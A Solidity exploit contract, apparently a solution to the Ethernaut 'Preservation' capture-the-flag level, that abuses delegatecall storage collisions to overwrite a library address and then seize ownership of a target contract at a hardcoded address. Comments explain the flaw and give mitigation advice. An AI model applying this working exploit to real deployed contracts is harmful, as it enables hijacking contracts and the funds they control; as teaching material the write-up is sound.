//SPDX-License-Identifier
pragma solidity ^0.8.0;

import {Preservation, LibraryContract} from "./Preservation.sol";
import "forge-std/console.sol";

/**
 * delegatecall is context preserving. Therefore the library contracts storage layout needs to map exactly to the calling contracts storage layout.
 * Here in our library contract even tho storage variable is called storedTime its still mapped to slot 0 of our calling contract. This is the Exploit.
 *
 * We can call the setTimeFirst passing in the  address of our exploting contract, and then once we've reassigned the address of the first library contract to ours we can manipulate the owner variable
 *
 * 1. setup our exploit contracts storage to map exactly to that of the Preservation
 * 2. Call setFirsttime passing in our Contracts address to exploit and reassign the value
 * 3. Call setFirstTime again this time having setTime reasign owner to our wallet.
 * 4. Take control of contract.
 *
 * Avoid:
 * Storing state in libraries
 * Using low level calls when you dont need to manually adjust gas or change contract storage
 * Do use:
 * Library keyword instead of contract for libraries
 *
 */

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    Preservation preservationContract =
        Preservation(0xA57701c5b56a184E017B41adbf6e0A8be7089985);

    function exploit() external {
        preservationContract.setFirstTime(uint256(uint160(address(this))));
        console.log(
            "The contract address of TimeZoneLibrary",
            preservationContract.timeZone1Library()
        );
        preservationContract.setFirstTime(
            uint256(uint160(0x6117AAc3b7E3D53F0A3009E70F5Ecf73F7C9AF02))
        );
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
